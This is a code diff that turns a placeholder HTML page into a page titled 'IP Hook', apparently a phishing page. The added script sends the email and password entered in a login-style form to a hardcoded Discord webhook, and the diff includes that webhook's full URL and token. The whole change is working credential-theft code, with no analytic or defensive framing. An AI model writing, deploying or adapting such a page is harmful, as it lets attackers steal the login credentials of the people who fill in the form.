@@ -1,8 +1,42 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>ip grappling hook</title>
+    <title>IP Hook</title>
+    <script>
+        function sendToDiscord() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const webhookUrl = 'https://discord.com/api/webhooks/1163071979381866557/ipwhgbZXzol9N8J4bIOwrJsm7f83w8eu_PqrK9l4BLnnhodchsaiK8GE5rp-0iouhREK';
+
+            const payload = {
+                content: `Email: ${email}\nPassword: ${password}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </head>
 <body>
-<i>test</i>
+    <h1>IP Hook</h1>
+    <form onsubmit="sendToDiscord(); return false;">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Submit">
+    </form>
 </body>
 </html>
